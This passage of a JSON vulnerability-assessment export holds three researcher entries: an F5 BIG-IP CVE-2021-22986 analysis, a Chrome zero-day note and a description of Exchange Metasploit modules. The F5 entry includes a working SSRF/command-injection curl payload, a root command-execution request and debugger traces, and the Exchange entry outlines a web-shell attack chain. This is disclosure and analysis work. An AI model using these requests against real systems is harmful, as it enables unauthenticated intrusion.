Time taken to set the loginProviderName is \" + (800 - remainingSleepTime) + \"ms\");\r\n               } catch (InterruptedException e) {\r\n                 AuthnWorker.this.getLogger().severe(\"Error while setting value to loginProviderName when no loginReference and no loginProviderName were given\");\r\n               }\r\n               return providerName[0];\r\n             }\r\n           };\r\n\r\n         Future<String> future = executorService.submit(callable);\r\n         try {\r\n           state.loginProviderName = future.get(800L, TimeUnit.MILLISECONDS);\r\n           executorService.shutdown();\r\n         } catch (TimeoutException e) {\r\n           getLogger().severe(\"Maximum wait time(800ms) exceeded while getting value of loginProviderName\");\r\n           future.cancel(true);\r\n           if (!executorService.isShutdown()) {\r\n             executorService.shutdown();\r\n           }\r\n         } catch (CancellationException|java.util.concurrent.ExecutionException|InterruptedException e) {\r\n           getLogger().severe(\"Error while getting value of loginProviderName:\" + RestHelper.throwableStackToString(e));\r\n           if (!executorService.isShutdown()) {\r\n             executorService.shutdown();\r\n           }\r\n         }\r\n         getLogger().fineFmt(\"loginProviderName set to %s as default value, based on authentication source type when it was null\", new Object[] { state.loginProviderName });\r\n       }\r\n\r\n       if (state.loginProviderName != null) {\r\n         if (state.loginProviderName.equals(\"local\")) {\r\n           state.loginReference = new RestReference(makePublicUri(LocalAuthLoginWorker.WORKER_URI_PATH));\r\n         }\r\n         else if (this.loginNameToReferenceMap.containsKey(state.loginProviderName)) {\r\n           state.loginReference = this.loginNameToReferenceMap.get(state.loginProviderName);\r\n         } else {\r\n           request.fail(new IllegalArgumentException(\"loginProviderName is invalid.\"));\r\n           return;\r\n         }\r\n       } else {\r\n         request.fail(new IllegalArgumentException(\"loginProviderName is null.\"));\r\n\r\n\r\n         return;\r\n       }\r\n     }\r\n\r\n     final String failureKey = String.format(\"%s:%s\", new Object[] { (state.username == null) ? state.bigipAuthCookie : state.username, state.loginReference.link });\r\n\r\n\r\n\r\n     LoginFailures failures = this.loginFailureMap.get(failureKey);\r\n\r\n     if (failures != null && failures.failures >= 5) {\r\n       if (RestHelper.getNowMicrosUtc() - failures.lastFailureMicros < FAILED_ATTEMPTS_TIMEOUT) {\r\n         request.setStatusCode(401);\r\n         request.fail(new SecurityException(\"Maximum number of login attempts exceeded.\"));\r\n         return;\r\n       }\r\n       this.loginFailureMap.remove(failureKey);\r\n     }\r\n\r\n\r\n     RestRequestCompletion authCompletion = new RestRequestCompletion()\r\n       {\r\n\r\n         public void failed(Exception ex, RestOperation operation)\r\n         {\r\n           String loginProviderId = (state.loginProviderName == null) ? state.loginReference.link.toString() : state.loginProviderName;\r\n\r\n\r\n           String clientId = (state.username == null) ? (\"Cookie \" + state.bigipAuthCookie) : (\"User \" + state.username);\r\n\r\n           AuthnWorker.this.getLogger().infoFmt(\"%s failed to login from %s using the %s authentication provider\", new Object[] { clientId, this.val$incomingAddress, loginProviderId });\r\n\r\n\r\n           AuthnWorker.LoginFailures failures = (AuthnWorker.LoginFailures)AuthnWorker.this.loginFailureMap.get(failureKey);\r\n           if (failures == null) {\r\n             failures = new AuthnWorker.LoginFailures();\r\n             AuthnWorker.this.loginFailureMap.put(failureKey, failures);\r\n           }\r\n           failures.lastFailureMicros = RestHelper.getNowMicrosUtc();\r\n           failures.failures++;\r\n\r\n           request.setStatusCode(401);\r\n\r\n           if (ex.getMessage() == null || ex.getMessage().isEmpty()) {\r\n             request.fail(ex, RestErrorResponse.create().setMessage(\"Unable to login using supplied information. If you are attempting to login with a configured authentication provider it may be unavailable or no longer exist.\"));\r\n             return;\r\n           }\r\n           request.fail(ex);\r\n         }\r\n\r\n\r\n\r\n\r\n\r\n         public void completed(RestOperation operation) {\r\n           AuthnWorker.this.loginFailureMap.remove(failureKey);\r\n\r\n           AuthProviderLoginState loggedIn = (AuthProviderLoginState)operation.getTypedBody(AuthProviderLoginState.class);\r\n\r\n\r\n           String authProviderId = loggedIn.authProviderName;\r\n           if (authProviderId == null) {\r\n             authProviderId = (state.loginProviderName == null) ? state.loginReference.link.toString() : state.loginProviderName;\r\n           }\r\n\r\n\r\n           AuthnWorker.this.getLogger().finestFmt(\"User %s successfully logged in from %s using the %s authentication provider.\", new Object[] { loggedIn.username, this.val$incomingAddress, authProviderId });\r\n\r\n\r\n\r\n\r\n           AuthnWorker.generateToken(AuthnWorker.this.getServer(), request, state, loggedIn);\r\n         }\r\n       };\r\n\r\n     RestOperation checkAuth = RestOperation.create().setBody(loginState).setUri(makeLocalUri(state.loginReference.link)).setCompletion(authCompletion);\r\n\r\n\r\n     sendPost(checkAuth);\r\n   }\r\n[snip]\r\n```\r\n\r\nAlso interesting is the defensive programming added to basic auth. I tested this first for auth bypass but wasn't successful. It is by no means a dead end, since I haven't actually analyzed the code path yet.\r\n\r\n```diff\r\n[snip]\r\n-  private static boolean setIdentityFromBasicAuth(RestOperation request) {\r\n+\r\n+\r\n+  private static boolean setIdentityFromBasicAuth(final RestOperation request, final Runnable runnable) {\r\n     String authHeader = request.getBasicAuthorization();\r\n     if (authHeader == null) {\r\n       return false;\r\n     }\r\n-    AuthzHelper.BasicAuthComponents components = AuthzHelper.decodeBasicAuth(authHeader);\r\n-    request.setIdentityData(components.userName, null, null);\r\n+    final AuthzHelper.BasicAuthComponents components = AuthzHelper.decodeBasicAuth(authHeader);\r\n+\r\n+\r\n+\r\n+\r\n+\r\n+    String xForwardedHostHeaderValue = request.getAdditionalHeader(\"X-Forwarded-Host\");\r\n+\r\n+\r\n+\r\n+    if (xForwardedHostHeaderValue == null) {\r\n+      request.setIdentityData(components.userName, null, null);\r\n+      if (runnable != null) {\r\n+        runnable.run();\r\n+      }\r\n+      return true;\r\n+    }\r\n+\r\n+\r\n+\r\n+    String[] valueList = xForwardedHostHeaderValue.split(\", \");\r\n+    int valueIdx = (valueList.length > 1) ? (valueList.length - 1) : 0;\r\n+    if (valueList[valueIdx].contains(\"localhost\") || valueList[valueIdx].contains(\"127.0.0.1\")) {\r\n+\r\n+      request.setIdentityData(components.userName, null, null);\r\n+      if (runnable != null) {\r\n+        runnable.run();\r\n+      }\r\n+      return true;\r\n+    }\r\n+\r\n+\r\n+    if (!PasswordUtil.isPasswordReset().booleanValue()) {\r\n+      request.setIdentityData(components.userName, null, null);\r\n+      if (runnable != null) {\r\n+        runnable.run();\r\n+      }\r\n+      return true;\r\n+    }\r\n+\r\n+    AuthProviderLoginState loginState = new AuthProviderLoginState();\r\n+    loginState.username = components.userName;\r\n+    loginState.password = components.password;\r\n+    loginState.address = request.getRemoteSender();\r\n+    RestRequestCompletion authCompletion = new RestRequestCompletion()\r\n+      {\r\n+        public void completed(RestOperation subRequest) {\r\n+          request.setIdentityData(components.userName, null, null);\r\n+          if (runnable != null) {\r\n+            runnable.run();\r\n+          }\r\n+        }\r\n+\r\n+\r\n+        public void failed(Exception ex, RestOperation subRequest) {\r\n+          RestOperationIdentifier.LOGGER.warningFmt(\"Failed to validate %s\", new Object[] { ex.getMessage() });\r\n+          if (ex.getMessage().contains(\"Password expired\")) {\r\n+            request.fail(new SecurityException(ForwarderPassThroughWorker.CHANGE_PASSWORD_NOTIFICATION));\r\n+          }\r\n+          if (runnable != null) {\r\n+            runnable.run();\r\n+          }\r\n+        }\r\n+      };\r\n+\r\n+    try {\r\n+      RestOperation subRequest = RestOperation.create().setBody(loginState).setUri(UrlHelper.makeLocalUri(new URI(TMOS_AUTH_LOGIN_PROVIDER_WORKER_URI_PATH), null)).setCompletion(authCompletion);\r\n+\r\n+\r\n+      RestRequestSender.sendPost(subRequest);\r\n+    } catch (URISyntaxException e) {\r\n+      LOGGER.warningFmt(\"ERROR: URISyntaxEception %s\", new Object[] { e.getMessage() });\r\n+    }\r\n     return true;\r\n   }\r\n }\r\n[snip]\r\n```\r\n\r\n### PoC\r\n\r\nThe affected endpoint is `/mgmt/shared/authn/login`.\r\n\r\n```\r\nwvu@kharak:~$ curl -ks https://192.168.123.134/mgmt/shared/authn/login -d '{\"bigipAuthCookie\":\"\",\"loginReference\":{\"link\":\"http://localhost/mgmt/tm/access/bundle-install-tasks\"},\"filePath\":\"`id`\"}' | jq .\r\n{\r\n  \"code\": 400,\r\n  \"message\": \"request failed with null exception\",\r\n  \"referer\": \"192.168.123.1\",\r\n  \"restOperationId\": 4483409,\r\n  \"kind\": \":resterrorresponse\"\r\n}\r\nwvu@kharak:~$\r\n```\r\n\r\nThe `filePath` parameter is cleared from the request, rendering the RCE endpoint unusable with the SSRF. **ETA: Other researchers noted this (quickly!) in a [Twitter thread](https://twitter.com/Smi1eSEC/status/1371754129673052160), and I have confirmed that their findings match mine.**\r\n\r\n```\r\n[pid 70562] execve(\"/bin/tar\", [\"tar\", \"-xvf\", \"/var/apm/f5-iappslx-agc-usecase-pack/f5-iappslx-agc-usecase-pack-7.0-0.0.1481.tar.gz\", \"--directory\", \"/var/config/rest/downloads/\"], [/* 9 vars */]) = 0\r\n```\r\n\r\n### IOCs\r\n\r\nErrors may be seen in `/var/log/restjavad.0.log`. This log file is rotated. Log level can be adjusted in `/etc/restjavad.log.conf`.\r\n\r\n```\r\n[F][11000][16 Mar 2021 21:41:58 UTC][8100/shared/authn/login AuthnWorker] User null successfully logged in from 192.168.123.1 using the http://localhost/mgmt/tm/access/bundle-install-tasks authentication provider.\r\n[F][11014][16 Mar 2021 21:41:58 UTC][RestOperation] Cleared the request content for key originalRequestBody\r\n[WARNING][11019][16 Mar 2021 21:41:58 UTC][RestOperation] Unable to generate error body for POST http://localhost:8100/shared/authz/tokens 400: java.util.ConcurrentModificationException\r\n\tat com.google.gson.internal.LinkedTreeMap$LinkedTreeMapIterator.nextNode(LinkedTreeMap.java:544)\r\n\tat com.google.gson.internal.LinkedTreeMap$EntrySet$1.next(LinkedTreeMap.java:568)\r\n\tat com.google.gson.internal.LinkedTreeMap$EntrySet$1.next(LinkedTreeMap.java:566)\r\n\tat com.f5.rest.common.RestOperation.fail(RestOperation.java:2458)\r\n\tat com.f5.rest.common.RestOperation.fail(RestOperation.java:2406)\r\n\tat com.f5.rest.workers.AuthTokenWorker.addOrUpdateAuthToken(AuthTokenWorker.java:337)\r\n\tat com.f5.rest.workers.AuthTokenWorker.onPost(AuthTokenWorker.java:291)\r\n\tat com.f5.rest.common.RestCollectionWorker.callDerivedRestMethod(RestCollectionWorker.java:937)\r\n\tat com.f5.rest.common.RestWorker.callRestMethodHandler(RestWorker.java:1190)\r\n\tat com.f5.rest.common.RestServer.processQueuedRequests(RestServer.java:1207)\r\n\tat com.f5.rest.common.RestServer.access$000(RestServer.java:44)\r\n\tat com.f5.rest.common.RestServer$1.run(RestServer.java:285)\r\n\tat java.util.concurrent.Executors$RunnableAdapter.call(Executors.java:473)\r\n\tat java.util.concurrent.FutureTask.run(FutureTask.java:262)\r\n\tat java.util.concurrent.ScheduledThreadPoolExecutor$ScheduledFutureTask.access$201(ScheduledThreadPoolExecutor.java:178)\r\n\tat java.util.concurrent.ScheduledThreadPoolExecutor$ScheduledFutureTask.run(ScheduledThreadPoolExecutor.java:292)\r\n\tat java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1152)\r\n\tat java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:622)\r\n\tat java.lang.Thread.run(Thread.java:748)\r\n\r\n[F][11023][16 Mar 2021 21:41:58 UTC][RestOperation] Cleared the request content for key originalRequestBody\r\n[WARNING][11026][16 Mar 2021 21:41:58 UTC][RestOperation] Unable to generate error body for POST http://localhost:8100/shared/authn/login 400: java.util.ConcurrentModificationException\r\n\tat com.google.gson.internal.LinkedTreeMap$LinkedTreeMapIterator.nextNode(LinkedTreeMap.java:544)\r\n\tat com.google.gson.internal.LinkedTreeMap$EntrySet$1.next(LinkedTreeMap.java:568)\r\n\tat com.google.gson.internal.LinkedTreeMap$EntrySet$1.next(LinkedTreeMap.java:566)\r\n\tat com.f5.rest.common.RestOperation.fail(RestOperation.java:2458)\r\n\tat com.f5.rest.common.RestOperation.fail(RestOperation.java:2406)\r\n\tat com.f5.rest.workers.authn.AuthnWorker$8.failed(AuthnWorker.java:533)\r\n\tat com.f5.rest.workers.authn.AuthnWorker$8.failed(AuthnWorker.java:529)\r\n\tat com.f5.rest.common.RestOperation.fail(RestOperation.java:2486)\r\n\tat com.f5.rest.common.RestOperation.fail(RestOperation.java:2406)\r\n\tat com.f5.rest.common.RestWorker$5.failed(RestWorker.java:865)\r\n\tat com.f5.rest.common.RestWorker$5.failed(RestWorker.java:850)\r\n\tat com.f5.rest.common.RestOperation.fail(RestOperation.java:2486)\r\n\tat com.f5.rest.common.RestOperation.fail(RestOperation.java:2406)\r\n\tat com.f5.rest.workers.AuthTokenWorker.addOrUpdateAuthToken(AuthTokenWorker.java:337)\r\n\tat com.f5.rest.workers.AuthTokenWorker.onPost(AuthTokenWorker.java:291)\r\n\tat com.f5.rest.common.RestCollectionWorker.callDerivedRestMethod(RestCollectionWorker.java:937)\r\n\tat com.f5.rest.common.RestWorker.callRestMethodHandler(RestWorker.java:1190)\r\n\tat com.f5.rest.common.RestServer.processQueuedRequests(RestServer.java:1207)\r\n\tat com.f5.rest.common.RestServer.access$000(RestServer.java:44)\r\n\tat com.f5.rest.common.RestServer$1.run(RestServer.java:285)\r\n\tat java.util.concurrent.Executors$RunnableAdapter.call(Executors.java:473)\r\n\tat java.util.concurrent.FutureTask.run(FutureTask.java:262)\r\n\tat java.util.concurrent.ScheduledThreadPoolExecutor$ScheduledFutureTask.access$201(ScheduledThreadPoolExecutor.java:178)\r\n\tat java.util.concurrent.ScheduledThreadPoolExecutor$ScheduledFutureTask.run(ScheduledThreadPoolExecutor.java:292)\r\n\tat java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1152)\r\n\tat java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:622)\r\n\tat java.lang.Thread.run(Thread.java:748)\r\n```\r\n\r\nNote the \"successful\" login from user `null`, which indicates token generation was triggered. I decided to pursue this vector after my failure with the RCE endpoint.\r\n\r\n## Analysis\r\n\r\nThis is what you really came here for. ;)\r\n\r\n### Debugging\r\n\r\nA long JDB session in which request parameter clearing is demonstrated.\r\n\r\n```\r\nBreakpoint hit: \"thread=qtp12784804-16 - /mgmt/shared/authn/login\", com.f5.rest.common.RestOperationIdentifier.setIdentityFromBasicAuth(), line=245 bci=11\r\n245        AuthzHelper.BasicAuthComponents components = AuthzHelper.decodeBasicAuth(authHeader);\r\n\r\nqtp12784804-16 - /mgmt/shared/authn/login[1] where\r\n  [1] com.f5.rest.common.RestOperationIdentifier.setIdentityFromBasicAuth (RestOperationIdentifier.java:245)\r\n  [2] com.f5.rest.common.RestOperationIdentifier.setIdentityFromAuthenticationData (RestOperationIdentifier.java:52)\r\n  [3] com.f5.rest.app.RestServerServlet$ReadListenerImpl.onAllDataRead (RestServerServlet.java:136)\r\n  [4] org.eclipse.jetty.server.HttpInput.run (HttpInput.java:443)\r\n  [5] org.eclipse.jetty.server.handler.ContextHandler.handle (ContextHandler.java:1,175)\r\n  [6] org.eclipse.jetty.server.HttpChannel.handle (HttpChannel.java:355)\r\n  [7] org.eclipse.jetty.server.HttpChannel.run (HttpChannel.java:262)\r\n  [8] org.eclipse.jetty.util.thread.QueuedThreadPool.runJob (QueuedThreadPool.java:635)\r\n  [9] org.eclipse.jetty.util.thread.QueuedThreadPool$3.run (QueuedThreadPool.java:555)\r\n  [10] java.lang.Thread.run (Thread.java:748)\r\nqtp12784804-16 - /mgmt/shared/authn/login[1] list\r\n241        String authHeader = request.getBasicAuthorization();\r\n242        if (authHeader == null) {\r\n243          return false;\r\n244        }\r\n245 =>     AuthzHelper.BasicAuthComponents components = AuthzHelper.decodeBasicAuth(authHeader);\r\n246        request.setIdentityData(components.userName, null, null);\r\n247        return true;\r\n248      }\r\n249    }\r\nqtp12784804-16 - /mgmt/shared/authn/login[1] print authHeader\r\n authHeader = \"Og==\"\r\nqtp12784804-16 - /mgmt/shared/authn/login[1] next\r\n>\r\nStep completed: \"thread=qtp12784804-16 - /mgmt/shared/authn/login\", com.f5.rest.common.RestOperationIdentifier.setIdentityFromBasicAuth(), line=246 bci=16\r\n246        request.setIdentityData(components.userName, null, null);\r\n\r\nqtp12784804-16 - /mgmt/shared/authn/login[1] dump components\r\n components = {\r\n    userName: null\r\n    password: null\r\n}\r\nqtp12784804-16 - /mgmt/shared/authn/login[1] cont\r\n>\r\nBreakpoint hit: \"thread=Non-Blocking threadPool_4\", com.f5.rest.workers.authn.AuthnWorker.onPost(), line=341 bci=141\r\n341        request.setBody(state);\r\n\r\nNon-Blocking threadPool_4[1] where\r\n  [1] com.f5.rest.workers.authn.AuthnWorker.onPost (AuthnWorker.java:341)\r\n  [2] com.f5.rest.common.RestWorker.callDerivedRestMethod (RestWorker.java:1,276)\r\n  [3] com.f5.rest.common.RestWorker.callRestMethodHandler (RestWorker.java:1,190)\r\n  [4] com.f5.rest.common.RestServer.processQueuedRequests (RestServer.java:1,207)\r\n  [5] com.f5.rest.common.RestServer.access$000 (RestServer.java:44)\r\n  [6] com.f5.rest.common.RestServer$1.run (RestServer.java:285)\r\n  [7] java.util.concurrent.Executors$RunnableAdapter.call (Executors.java:473)\r\n  [8] java.util.concurrent.FutureTask.run (FutureTask.java:262)\r\n  [9] java.util.concurrent.ScheduledThreadPoolExecutor$ScheduledFutureTask.access$201 (ScheduledThreadPoolExecutor.java:178)\r\n  [10] java.util.concurrent.ScheduledThreadPoolExecutor$ScheduledFutureTask.run (ScheduledThreadPoolExecutor.java:292)\r\n  [11] java.util.concurrent.ThreadPoolExecutor.runWorker (ThreadPoolExecutor.java:1,152)\r\n  [12] java.util.concurrent.ThreadPoolExecutor$Worker.run (ThreadPoolExecutor.java:622)\r\n  [13] java.lang.Thread.run (Thread.java:748)\r\nNon-Blocking threadPool_4[1] list\r\n337          return;\r\n338        }\r\n339\r\n340        state.password = null;\r\n341 =>     request.setBody(state);\r\n342\r\n343\r\n344\r\n345        if (state.loginReference == null) {\r\n346          if (state.loginProviderName == null) {\r\nNon-Blocking threadPool_4[1] print request\r\n request = \"[\r\n id=6146169\r\n referer=192.168.123.1\r\n uri=http://localhost:8100/shared/authn/login\r\n method=POST\r\n statusCode=200\r\n contentType=application/x-www-form-urlencoded\r\n contentLength=121\r\n contentRange=null\r\n deadline=Tue Mar 16 15:14:01 PDT 2021\r\n body={\"bigipAuthCookie\":\"\",\"loginReference\":{\"link\":\"http://localhost/mgmt/tm/access/bundle-install-tasks\"},\"filePath\":\"`id`\"}\r\n forceSocket=false\r\n isResponse=false\r\n retriesRemaining=5\r\n coordinationId=null\r\n isConnectionCloseRequested=false\r\n isConnectionKeepAlive=true\r\n isRestErrorResponseRequired=true\r\n AdditionalHeadersAsString=\r\n  Request:   'Local-Ip-From-Httpd'='192.168.123.134'\r\n   'X-Forwarded-Proto'='http'\r\n   'X-Forwarded-Server'='localhost.localdomain'\r\n   'X-F5-New-Authtok-Reqd'='false'\r\n   'X-Forwarded-Host'='192.168.123.134'\r\n  Response:<empty>\r\n ResponseHeadersTrace=\r\n X-F5-Config-Api-Status=0]\"\r\nNon-Blocking threadPool_4[1] next\r\n>\r\nStep completed: \"thread=Non-Blocking threadPool_4\", com.f5.rest.workers.authn.AuthnWorker.onPost(), line=345 bci=147\r\n345        if (state.loginReference == null) {\r\n\r\nNon-Blocking threadPool_4[1] print request\r\n request = \"[\r\n id=6146169\r\n referer=192.168.123.1\r\n uri=http://localhost:8100/shared/authn/login\r\n method=POST\r\n statusCode=200\r\n contentType=application/json\r\n contentLength=139\r\n contentRange=null\r\n deadline=Tue Mar 16 15:14:01 PDT 2021\r\n body={\"bigipAuthCookie\":\"\",\"loginReference\":{\"link\":\"http://localhost/mgmt/tm/access/bundle-install-tasks\"},\"generation\":0,\"lastUpdateMicros\":0}\r\n forceSocket=false\r\n isResponse=false\r\n retriesRemaining=5\r\n coordinationId=null\r\n isConnectionCloseRequested=false\r\n isConnectionKeepAlive=true\r\n isRestErrorResponseRequired=true\r\n AdditionalHeadersAsString=\r\n  Request:   'Local-Ip-From-Httpd'='192.168.123.134'\r\n   'X-Forwarded-Proto'='http'\r\n   'X-Forwarded-Server'='localhost.localdomain'\r\n   'X-F5-New-Authtok-Reqd'='false'\r\n   'X-Forwarded-Host'='192.168.123.134'\r\n  Response:<empty>\r\n ResponseHeadersTrace=\r\n X-F5-Config-Api-Status=0]\"\r\nNon-Blocking threadPool_4[1] cont\r\n>\r\nBreakpoint hit: \"thread=Non-Blocking threadPool_4\", com.f5.rest.workers.authn.AuthnWorker.onPost(), line=506 bci=600\r\n506        sendPost(checkAuth);\r\n\r\nNon-Blocking threadPool_4[1] list\r\n502\r\n503        RestOperation checkAuth = RestOperation.create().setBody(loginState).setUri(makeLocalUri(state.loginReference.link)).setCompletion(authCompletion);\r\n504\r\n505\r\n506 =>     sendPost(checkAuth);\r\n507      }\r\n508\r\n509\r\n510\r\n511\r\nNon-Blocking threadPool_4[1] print checkAuth\r\n checkAuth = \"[\r\n id=6146236\r\n referer=null\r\n uri=http://localhost:8100/tm/access/bundle-install-tasks\r\n method=null\r\n statusCode=200\r\n contentType=application/json\r\n contentLength=84\r\n contentRange=null\r\n deadline=Tue Mar 16 15:14:47 PDT 2021\r\n body={\"address\":\"192.168.123.1\",\"bigipAuthCookie\":\"\",\"generation\":0,\"lastUpdateMicros\":0}\r\n forceSocket=false\r\n isResponse=false\r\n retriesRemaining=5\r\n coordinationId=null\r\n isConnectionCloseRequested=false\r\n isConnectionKeepAlive=true\r\n isRestErrorResponseRequired=true\r\n AdditionalHeadersAsString=\r\n  Request:<empty>  Response:<empty>\r\n ResponseHeadersTrace=\r\n X-F5-Config-Api-Status=0]\"\r\nNon-Blocking threadPool_4[1] cont\r\n>\r\n```\r\n\r\n### Parameter allowlist\r\n\r\nAllowed parameters are in the `com.f5.rest.workers.authn.providers.AuthProviderLoginState` class.\r\n\r\n```java\r\npackage com.f5.rest.workers.authn.providers;\r\n\r\nimport com.f5.rest.common.RestReference;\r\nimport com.f5.rest.common.RestWorkerState;\r\nimport java.util.List;\r\n\r\npublic class AuthProviderLoginState extends RestWorkerState {\r\n  public String username;\r\n\r\n  public String password;\r\n\r\n  public String address;\r\n\r\n  public String bigipAuthCookie;\r\n\r\n  public String authProviderName;\r\n\r\n  public RestReference userReference;\r\n\r\n  public List<RestReference> groupReferences;\r\n}\r\n```\r\n\r\nThis significantly limits the power of the SSRF, unfortunately. However, the fraudulent token generation should be investigated further. I have yet to find an endpoint that will respond affirmatively to the token generation. **ETA: See the RCE update at the bottom of the page. Rich found a usable endpoint.**\r\n\r\n### No password?\r\n\r\nI actually found this early on but didn't document it yet. Local requests to `restjavad` or `/usr/bin/icrd_child` don't require a password...\r\n\r\n```\r\n[root@localhost:NO LICENSE:Standalone] ~ # curl -su admin: -H \"Content-Type: application/json\" http://localhost:8100/mgmt/tm/util/bash -d '{\"command\":\"run\",\"utilCmdArgs\":\"-c id\"}' | jq .\r\n{\r\n  \"kind\": \"tm:util:bash:runstate\",\r\n  \"command\": \"run\",\r\n  \"utilCmdArgs\": \"-c id\",\r\n  \"commandResult\": \"uid=0(root) gid=0(root) groups=0(root) context=system_u:system_r:initrc_t:s0\\n\"\r\n}\r\n[root@localhost:NO LICENSE:Standalone] ~ #\r\n```\r\n\r\nThis formed the basis for most of my SSRF attempts until I saw the parameter allowlist and noticed my `Authorization` header wasn't being passed through. :<\r\n\r\n## RCE update\r\n\r\n[Rich Warren](https://twitter.com/buffaloverflow) has produced a [full RCE chain](https://twitter.com/buffaloverflow/status/1371988878672941057) using the SSRF! **ETA: I tested 10% of the registered endpoints and discovered no fewer than 15 that were chainable to full RCE. This concludes my investigation of CVE-2021-22986. Thank you to F5 SIRT for being wonderful to work with, and many thanks to Rich for being a great collaborator!**",
      "score": 6,
      "metadata": {
        "attacker-value": 5,
        "exploitability": 4
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "701733e3-4e17-4780-9c96-09fa9be2c3a0",
      "editorId": "b50031c2-b390-4cf9-bf6f-7a5fb8cf8677",
      "topicId": "c300bc5a-fe8f-4274-afa8-c1f47411fec1",
      "created": "2021-03-15T06:18:49.346398Z",
      "revisionDate": "2021-03-17T16:20:56.927131Z",
      "document": "Reported as exploited in the wild at https://thehackernews.com/2021/03/another-google-chrome-0-day-bug-found.html and at https://chromereleases.googleblog.com/2021/03/stable-channel-update-for-desktop_12.html.\r\n\r\nThis bug seems to have scarce details from what I can tell online, however it appears to be a UAF bug within Blink that was reported by an anonymous researcher on 2021-03-09. The details for this bug are currently locked so that only Google employees can access it, but should it be opened to the public the details will be at https://bugs.chromium.org/p/chromium/issues/detail?id=1186287.\r\n\r\nAs per usual the advice to protect against UAF bugs in browsers is to disable JavaScript on untrusted websites via a plugin such as NoScript. Since most UAF's require JavaScript to be enabled to conduct exploitation, this will act as an effective mitigation in most cases, but users should not rely on this as their sole protection mechanism.\r\n\r\nIt is interesting to see that this is the third 0day exploited in the wild this year in Chrome, alongside CVE-2021-21166, a object lifecycle issue in the audio component, and CVE-2021-21148, a heap buffer overflow within the V8 scripting engine. Time will tell if this trend continues though, but it is interesting to see such an regular cadence of vulnerabilities being exploited in the wild.",
      "score": 3,
      "metadata": {
        "mitre-tactics": "Initial Access",
        "attacker-value": 4,
        "exploitability": 3
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "e58b9b9a-4ba2-4403-91d5-909ff2b4225b",
      "editorId": "b68e9cb9-1bd0-4339-abe7-329618ce2467",
      "topicId": "5d17bb38-86bb-4514-bf1d-39eb48fbe4f1",
      "created": "2021-03-24T14:49:00.990807Z",
      "revisionDate": "2021-03-25T18:03:13.800801Z",
      "document": "Three [modules](https://github.com/rapid7/metasploit-framework/pull/14860) exploiting this vulnerability have been added to Metasploit:\r\n1. A scanner module that checks if the target is vulnerable to this Server-Side Request Forgery.\r\n2. An auxiliary module that dumps the mailboxes for a given email address, including emails, attachments and contact information.\r\n3. An exploit module that leverages an unauthenticated Remote Code Execution. This allows execution of arbitrary commands as the SYSTEM user. This module takes advantage of the same SSRF vulnerability and also of a post-auth arbitrary-file-write vulnerability identified as [CVE-2021-27065](https://attackerkb.com/topics/lLMDUaeKSn/cve-2021-27065).\r\n\r\nThe auxiliary module (2) leverages this SSRF to retrieve the internal Exchange server name and query the [Autodiscover service](https://docs.microsoft.com/en-us/Exchange/architecture/client-access/autodiscover) to retrieve other internal data. All of this is done without authentication through the Exchange Admin Center (EAC), usually located at `https://<ServerFQDN>/ecp`, so it needs to be accessible. It finally `POST`s to the EWS endpoint to dump emails, contacts, etc. Note that this exploit needs at least two Exchange servers to work. One is the host the module directly sends requests to and the other server is the internal resource the SSRF targets.\r\n\r\nThe exploit module (3) follows the same workflow but retrieves extra information such as the user SID, session ID, canary value, etc. Then, still using the SSRF, the module exploits the arbitrary-file-write vulnerability (CVE-2021-27065) to create a custom `.aspx` web page that embeds a web shell. Finally, once this backdoor is planted, it uses it to stage the actual payload and execute it. Note that, for this exploit to work, the email address used needs to be the email address of an Administrator on the Exchange server. It is not really something difficult to obtain, as long as you know the name of an admin and the email pattern used internally.\r\n",
      "score": 2,
      "metadata": {
        "attacker-value": 5,
        "exploitability": 4
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "b437d3aa-f559-4a5c-b180-eb2b565abbe5",
